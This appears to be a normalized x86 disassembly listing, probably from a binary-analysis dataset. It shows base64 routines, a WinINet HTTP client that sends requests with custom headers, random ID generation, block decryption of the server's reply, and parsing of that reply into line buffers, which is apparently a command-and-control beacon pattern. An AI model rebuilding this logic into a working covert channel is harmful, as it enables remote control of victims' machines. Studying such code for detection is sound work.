sub_401000
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
sar ecx 0x2
mov edx [ ebp + 0x8 ]
mov al [ ecx + r--data ]
mov [ edx ] al
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
and edx 0x3
shl edx 0x4
mov eax [ ebp + 0xc ]
movzx ecx [ eax + 0x1 ]
and ecx 0xf0
sar ecx 0x4
or edx ecx
mov eax [ ebp + 0x8 ]
mov cl [ edx + r--data ]
mov [ eax + 0x1 ] cl
cmp [ ebp + 0x10 ] 0x1
jle r-xdata
mov [ ebp - 0x1 ] 0x3d
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x1 ]
and eax 0xf
shl eax 0x2
mov ecx [ ebp + 0xc ]
movzx edx [ ecx + 0x2 ]
and edx 0xc0
sar edx 0x6
or eax edx
mov al [ eax + r--data ]
mov [ ebp - 0x1 ] al
jmp r-xdata
mov [ ebp - 0x2 ] 0x3d
mov eax [ ebp + 0xc ]
movzx ecx [ eax + 0x2 ]
and ecx 0x3f
mov dl [ ecx + r--data ]
mov [ ebp - 0x2 ] dl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0x1 ]
mov [ ecx + 0x2 ] dl
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x2 ]
mov [ eax + 0x3 ] cl
mov esp ebp
pop ebp
retn
sub_4010b0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x8 ] 0x3
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
movsx edx [ ebp - 0xc ]
shl edx 0x2
movsx eax [ ebp - 0xb ]
sar eax 0x4
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dl
movsx edx [ ebp - 0xb ]
shl edx 0x4
movsx eax [ ebp - 0xa ]
sar eax 0x2
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1 ] dl
movsx edx [ ebp - 0xa ]
shl edx 0x6
and edx 0xc0
movsx eax [ ebp - 0x9 ]
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x2 ] dl
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
cmp edx 0x3d
jne r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov dl [ eax * 4 + r--data ]
mov [ ebp + ecx - 0xc ] dl
mov eax [ ebp - 0x4 ]
mov [ ebp + eax - 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx ecx [ ebp + eax - 0xc ]
cmp ecx 0x50
jne r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_401190
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0x4 ]
cmp ecx 0x4
jge r-xdata
mov [ ebp - 0xc ] 0x4
mov edx [ ebp + 0x10 ]
sub edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_401000
add esp 0xc
mov ecx [ ebp + 0x8 ]
add ecx 0x4
mov [ ebp + 0x8 ] ecx
mov edx [ ebp + 0xc ]
add edx 0x3
mov [ ebp + 0xc ] edx
mov eax [ ebp - 0x4 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_401210
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov al [ edx ]
mov [ ebp - 0x15 ] al
add [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4010b0
add esp 0x8
add eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
jns r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x3
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x4
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov esp ebp
pop ebp
retn
sub_4012c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_401210
add esp 0x8
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov esp ebp
pop ebp
retn
sub_4012f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401340
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ InternetOpenA@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_401380
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
push 0x0
push 0x0
movzx ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call [ InternetConnectA@IAT ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
sub_4013d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x1c ]
or ecx __dos_header
push ecx
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0x1c
sub_401430
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
sub_401460
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401430
mov edx [ ebp - 0x4 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov eax 0x1
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
sub_4014c0
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov al [ edx ]
mov [ ebp - 0x15 ] al
add [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
call [ HttpAddRequestHeadersA@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_401520
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x14 ]
mov cl [ eax ]
mov [ ebp - 0x19 ] cl
add [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
sub_4015b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
push edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_40a4d0
add esp 0xc
push 0x0
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push 0x16
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
sub_401600
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
sub eax [ edx ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
add edx [ ecx ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
call [ InternetReadFile@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn 0xc
sub_401670
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x1c ] ecx
call [ GetTickCount@IAT ]
mov [ ebp - 0x14 ] eax
call [ GetCurrentThreadId@IAT ]
mov [ ebp - 0x8 ] eax
call [ GetCurrentProcessId@IAT ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0x63
div ecx
push edx
mov eax [ ebp - 0x1c ]
xor edx edx
mov ecx 0x270f
div ecx
push edx
mov edx [ ebp - 0x14 ]
and edx 0x270f
push edx
call sub_404ac6
cdq
mov ecx 0x270f
idiv ecx
push edx
call sub_404ac6
cdq
mov ecx 0x63
idiv ecx
push edx
push r--data
mov edx [ ebp + 0x8 ]
push edx
call sub_404a12
add esp 0x1c
mov esp ebp
pop ebp
retn
sub_401700
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
push 0x10000
push 0x0
mov eax [ ebp - 0xc ]
add eax 0xa84
push eax
call sub_40a4d0
add esp 0xc
push 0x1000
push 0x0
mov ecx [ ebp - 0xc ]
add ecx 0x10a84
push ecx
call sub_40a4d0
add esp 0xc
push 0x64
push 0x0
mov edx [ ebp - 0xc ]
add edx 0xc8
push edx
call sub_40a4d0
add esp 0xc
push 0x100
push 0x0
mov eax [ ebp - 0xc ]
add eax 0x208
push eax
call sub_40a4d0
add esp 0xc
push 0x200
push 0x0
mov ecx [ ebp - 0xc ]
add ecx 0x308
push ecx
call sub_40a4d0
add esp 0xc
push 0x64
push 0x0
mov edx [ ebp - 0xc ]
add edx 0x140
push edx
call sub_40a4d0
add esp 0xc
push 0x64
push 0x0
mov eax [ ebp - 0xc ]
add eax 0x1a4
push eax
call sub_40a4d0
add esp 0xc
xor ecx ecx
mov edx [ ebp - 0xc ]
add edx 0x508
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] ecx
mov [ edx + 0x1c ] ecx
push 0x64
push 0x0
mov eax [ ebp - 0xc ]
add eax 0x64
push eax
call sub_40a4d0
add esp 0xc
push 0x64
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call sub_40a4d0
add esp 0xc
push 0x400
push 0x0
mov edx [ ebp - 0xc ]
add edx 0x11a84
push edx
call sub_40a4d0
add esp 0xc
push 0x400
push 0x0
mov eax [ ebp - 0xc ]
add eax 0x628
push eax
call sub_40a4d0
add esp 0xc
push 0x100
push 0x0
mov ecx [ ebp - 0xc ]
add ecx 0x528
push ecx
call sub_40a4d0
add esp 0xc
mov edx [ ebp - 0xc ]
mov [ edx + 0x11e84 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
call [ QueryPerformanceCounter@IAT ]
call [ GetTickCount@IAT ]
add eax [ ebp - 0x8 ]
push eax
call sub_404ab4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ ecx + 0xa28 ] 0x0
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_401880
push ebp
mov ebp esp
sub esp 0x5a0
mov [ ebp - 0x590 ] ecx
mov [ ebp - 0x78 ] 0x0
push 0x63
push 0x0
lea eax [ ebp - 0x77 ]
push eax
call sub_40a4d0
add esp 0xc
mov [ ebp - 0x588 ] 0x0
push 0x3e7
push 0x0
lea ecx [ ebp - 0x587 ]
push ecx
call sub_40a4d0
add esp 0xc
lea edx [ ebp - 0x78 ]
push edx
push r--data
call sub_4012c0
add esp 0x8
mov eax [ ebp + 0xc ]
push eax
call sub_401170
add esp 0x4
mov [ ebp - 0x19c ] eax
lea ecx [ ebp - 0x588 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4012c0
add esp 0x8
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ ebp - 0xf ] eax
mov [ ebp - 0xb ] eax
mov [ ebp - 0x7 ] eax
mov [ ebp - 0x3 ] ax
mov [ ebp - 0x1 ] al
mov [ ebp - 0x9c ] 0x0
xor ecx ecx
mov [ ebp - 0x9b ] ecx
mov [ ebp - 0x97 ] ecx
mov [ ebp - 0x93 ] ecx
mov [ ebp - 0x8f ] ecx
mov [ ebp - 0x8b ] ecx
mov [ ebp - 0x87 ] ecx
mov [ ebp - 0x83 ] ecx
mov [ ebp - 0x7f ] cx
mov [ ebp - 0x7d ] cl
mov edx [ ebp - 0x588 ]
mov [ ebp - 0x9c ] edx
mov eax [ ebp - 0x584 ]
mov [ ebp - 0x98 ] eax
mov ecx [ ebp - 0x580 ]
mov [ ebp - 0x94 ] ecx
mov edx [ ebp - 0x57c ]
mov [ ebp - 0x90 ] edx
lea eax [ ebp - 0x198 ]
push eax
push 0x80
lea ecx [ ebp - 0x78 ]
push ecx
call sub_410780
add esp 0xc
mov edx [ ebp - 0x19c ]
sub edx 0x10
mov [ ebp - 0x19c ] edx
mov eax [ ebp - 0x19c ]
cdq
and edx 0xf
add eax edx
sar eax 0x4
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x578 ]
mov [ ebp - 0xa0 ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x1a0 ] ecx
mov [ ebp - 0x58c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x58c ]
cmp eax [ ebp - 0x7c ]
jae r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x594 ] edx
mov eax [ ebp - 0x594 ]
add eax 0x1
mov [ ebp - 0x598 ] eax
mov ecx [ ebp - 0x9c ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x98 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] ecx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x198 ]
push eax
push 0x10
mov ecx [ ebp - 0x1a0 ]
push ecx
mov edx [ ebp - 0xa0 ]
push edx
call sub_4100b3
add esp 0x18
mov eax [ ebp - 0xa0 ]
add eax 0x10
mov [ ebp - 0xa0 ] eax
mov ecx [ ebp - 0x1a0 ]
add ecx 0x10
mov [ ebp - 0x1a0 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x594 ]
mov dl [ ecx ]
mov [ ebp - 0x599 ] dl
add [ ebp - 0x594 ] 0x1
cmp [ ebp - 0x599 ] 0x0
jne r-xdata
mov eax [ ebp - 0x594 ]
sub eax [ ebp - 0x598 ]
mov [ ebp - 0x5a0 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x5a0 ]
mov [ ecx ] edx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebp - 0x58c ]
add edx 0x1
mov [ ebp - 0x58c ] edx
sub_401ab0
push ebp
mov ebp esp
sub esp 0x138
mov [ ebp - 0x128 ] ecx
mov eax [ ebp - 0x128 ]
mov [ eax + 0xa7c ] 0x0
mov ecx [ ebp - 0x128 ]
mov [ ecx + 0xa80 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_4012f0
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401340
mov [ ebp - 0x4 ] eax
push 0x3
mov edx [ ebp + 0xc ]
push edx
call sub_404b8c
add esp 0x4
push eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_401380
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x80080000
push 0x0
push 0x0
push r--data
mov ecx [ ebp + 0x10 ]
push ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4013d0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x114 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_401320
mov eax [ ebp - 0x114 ]
jmp r-xdata
mov [ ebp - 0x110 ] 0x0
push 0xff
push 0x0
lea edx [ ebp - 0x10f ]
push edx
call sub_40a4d0
add esp 0xc
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
push 0x100
lea edx [ ebp - 0x110 ]
push edx
call sub_404a96
add esp 0x14
push 0x20000000
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x20000000
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x20000000
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x20000000
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x20000000
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x20000000
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x20000000
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x20000000
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x128 ]
add ecx 0x140
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x12c ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov [ ebp - 0x118 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_401320
mov eax [ ebp - 0x118 ]
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x12c ]
mov cl [ eax ]
mov [ ebp - 0x131 ] cl
add [ ebp - 0x12c ] 0x1
cmp [ ebp - 0x131 ] 0x0
jne r-xdata
mov edx [ ebp - 0x12c ]
sub edx [ ebp - 0x130 ]
mov [ ebp - 0x138 ] edx
je r-xdata
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401520
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x128 ]
add eax 0x140
push eax
push r--data
push 0x100
lea ecx [ ebp - 0x110 ]
push ecx
call sub_404a96
add esp 0x10
push 0x20000000
lea edx [ ebp - 0x110 ]
push edx
lea ecx [ ebp - 0x10 ]
call sub_4014c0
mov [ ebp - 0x4 ] eax
push 0x1000
push 0x0
mov eax [ ebp - 0x128 ]
add eax 0x10a84
push eax
call sub_40a4d0
add esp 0xc
mov ecx [ ebp - 0x128 ]
add ecx 0xa7c
push ecx
push 0x1000
mov edx [ ebp - 0x128 ]
add edx 0x10a84
push edx
lea ecx [ ebp - 0x10 ]
call sub_4015b0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x11c ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_401320
mov eax [ ebp - 0x11c ]
jmp r-xdata
push 0x10000
push 0x0
mov eax [ ebp - 0x128 ]
add eax 0xa84
push eax
call sub_40a4d0
add esp 0xc
mov ecx [ ebp - 0x128 ]
add ecx 0xa80
push ecx
push 0x10000
mov edx [ ebp - 0x128 ]
add edx 0xa84
push edx
lea ecx [ ebp - 0x10 ]
call sub_401600
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
lea ecx [ ebp - 0x10 ]
call sub_401320
mov eax [ ebp - 0x124 ]
mov [ ebp - 0x120 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_401320
mov eax [ ebp - 0x120 ]
jmp r-xdata
sub_401e00
push ebp
mov ebp esp
sub esp 0x580
mov [ ebp - 0x580 ] ecx
lea ecx [ ebp - 0x34 ]
call sub_4012f0
mov [ ebp - 0x138 ] 0x0
push 0xff
push 0x0
lea eax [ ebp - 0x137 ]
push eax
call sub_40a4d0
add esp 0xc
mov [ ebp - 0x20 ] 0x0
xor ecx ecx
mov [ ebp - 0x1f ] ecx
mov [ ebp - 0x1b ] ecx
mov [ ebp - 0x17 ] ecx
mov [ ebp - 0x13 ] ecx
mov [ ebp - 0xf ] ecx
mov [ ebp - 0xb ] ecx
mov [ ebp - 0x7 ] ecx
mov [ ebp - 0x3 ] cx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x158 ] 0x0
xor edx edx
mov [ ebp - 0x157 ] edx
mov [ ebp - 0x153 ] edx
mov [ ebp - 0x14f ] edx
mov [ ebp - 0x14b ] edx
mov [ ebp - 0x147 ] edx
mov [ ebp - 0x143 ] edx
mov [ ebp - 0x13f ] edx
mov [ ebp - 0x13b ] dx
mov [ ebp - 0x139 ] dl
lea eax [ ebp - 0x20 ]
push eax
call sub_401670
add esp 0x4
lea ecx [ ebp - 0x158 ]
push ecx
call sub_401670
add esp 0x4
lea edx [ ebp - 0x158 ]
push edx
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push r--data
lea edx [ ebp - 0x138 ]
push edx
call sub_402170
add esp 0x14
lea eax [ ebp - 0x138 ]
push eax
push r--data
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x580 ]
call sub_401ab0
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ ebp - 0x57c ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_401320
mov eax [ ebp - 0x57c ]
mov [ ebp - 0x55c ] 0x400
mov [ ebp - 0x558 ] 0x0
push 0x3ff
push 0x0
lea edx [ ebp - 0x557 ]
push edx
call sub_40a4d0
add esp 0xc
lea eax [ ebp - 0x55c ]
push eax
lea ecx [ ebp - 0x558 ]
push ecx
mov edx [ ebp - 0x580 ]
mov eax [ edx + 0xa80 ]
push eax
mov ecx [ ebp - 0x580 ]
add ecx 0xa84
push ecx
mov ecx [ ebp - 0x580 ]
call sub_401880
mov edx [ ebp - 0x580 ]
cmp [ edx + 0xa80 ] 0x1
jbe r-xdata
mov eax [ ebp - 0x580 ]
cmp [ eax + 0xa80 ] 0x400
ja r-xdata
push r--data
mov ecx [ ebp + 0xc ]
push ecx
call sub_4021a0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x570 ] 0x0
mov [ ebp - 0x574 ] 0x0
mov [ ebp - 0x56c ] 0x0
jmp r-xdata
mov [ ebp - 0x564 ] 0x0
mov [ ebp - 0x568 ] 0x0
mov [ ebp - 0x560 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x570 ]
cmp edx [ ebp - 0x55c ]
jae r-xdata
mov eax [ ebp - 0x564 ]
cmp eax [ ebp - 0x55c ]
jae r-xdata
mov [ ebp - 0x578 ] 0x1
lea ecx [ ebp - 0x34 ]
call sub_401320
mov eax [ ebp - 0x578 ]
jmp r-xdata
mov eax [ ebp - 0x570 ]
movzx ecx [ ebp + eax - 0x558 ]
cmp ecx 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x564 ]
movzx edx [ ebp + ecx - 0x558 ]
cmp edx 0x20
jne r-xdata
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x570 ]
movzx eax [ ebp + edx - 0x558 ]
cmp eax 0xa
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x564 ]
movzx ecx [ ebp + eax - 0x558 ]
cmp ecx 0xa
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x56c ]
shl edx 0x6
add edx [ ebp - 0x574 ]
mov eax [ ebp - 0x580 ]
mov ecx [ ebp - 0x570 ]
mov cl [ ebp + ecx - 0x558 ]
mov [ eax + edx + 0x11a84 ] cl
mov edx [ ebp - 0x574 ]
add edx 0x1
mov [ ebp - 0x574 ] edx
jmp r-xdata
mov [ ebp - 0x574 ] 0x0
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
cmp [ ebp - 0x56c ] 0x10
jne r-xdata
mov eax [ ebp - 0x560 ]
shl eax 0x6
add eax [ ebp - 0x568 ]
mov ecx [ ebp - 0x580 ]
mov edx [ ebp - 0x564 ]
mov dl [ ebp + edx - 0x558 ]
mov [ ecx + eax + 0x628 ] dl
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
jmp r-xdata
